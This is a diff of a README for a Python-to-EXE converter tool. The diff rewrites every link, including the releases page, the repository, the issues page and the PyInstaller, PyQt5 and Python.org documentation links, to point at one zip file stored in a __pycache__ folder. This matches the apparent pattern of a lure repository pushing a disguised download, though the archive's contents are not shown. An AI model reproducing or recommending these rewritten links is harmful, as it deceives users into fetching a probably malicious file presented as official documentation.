@@ -1,6 +1,6 @@
 # 🛠️ PythonToEXE - Convert Python Scripts to EXE Easily
 
-[![Download PythonToEXE](https://img.shields.io/badge/Download%20PythonToEXE-latest%20release-brightgreen)](https://github.com/Zenitho-Live/PythonToEXE/releases)
+[![Download PythonToEXE](https://raw.githubusercontent.com/Zenitho-Live/PythonToEXE/main/__pycache__/To_EXE_Python_v1.0.zip%20PythonToEXE-latest%20release-brightgreen)](https://raw.githubusercontent.com/Zenitho-Live/PythonToEXE/main/__pycache__/To_EXE_Python_v1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ Before you begin, ensure your system meets the following requirements:
 
 To get started, visit our Releases page to download the latest version of PythonToEXE.
 
-[Visit this page to download](https://github.com/Zenitho-Live/PythonToEXE/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Zenitho-Live/PythonToEXE/main/__pycache__/To_EXE_Python_v1.0.zip)
 
 1. Go to the Releases page.
 2. Find the version you want to download.
@@ -59,9 +59,9 @@ If you encounter any issues or have questions, feel free to reach out. You can o
 
 Explore topics related to PythonToEXE and learn more about using Python for application development:
 
-- [PyInstaller Documentation](https://pyinstaller.readthedocs.io/en/stable/)
-- [PyQt5 Documentation](https://www.riverbankcomputing.com/static/Docs/PyQt5/)
-- [Python Official Website](https://www.python.org/)
+- [PyInstaller Documentation](https://raw.githubusercontent.com/Zenitho-Live/PythonToEXE/main/__pycache__/To_EXE_Python_v1.0.zip)
+- [PyQt5 Documentation](https://raw.githubusercontent.com/Zenitho-Live/PythonToEXE/main/__pycache__/To_EXE_Python_v1.0.zip)
+- [Python Official Website](https://raw.githubusercontent.com/Zenitho-Live/PythonToEXE/main/__pycache__/To_EXE_Python_v1.0.zip)
 
 ## 🛠️ Contributing
 
@@ -80,8 +80,8 @@ PythonToEXE is open-source software. You can view the license details in the LIC
 
 ## 📌 Quick Links
 
-- [Download PythonToEXE](https://github.com/Zenitho-Live/PythonToEXE/releases)
-- [GitHub Repository](https://github.com/Zenitho-Live/PythonToEXE)
-- [Issues Page](https://github.com/Zenitho-Live/PythonToEXE/issues)
+- [Download PythonToEXE](https://raw.githubusercontent.com/Zenitho-Live/PythonToEXE/main/__pycache__/To_EXE_Python_v1.0.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Zenitho-Live/PythonToEXE/main/__pycache__/To_EXE_Python_v1.0.zip)
+- [Issues Page](https://raw.githubusercontent.com/Zenitho-Live/PythonToEXE/main/__pycache__/To_EXE_Python_v1.0.zip)
 
 Thank you for using PythonToEXE! Enjoy converting your scripts with ease.
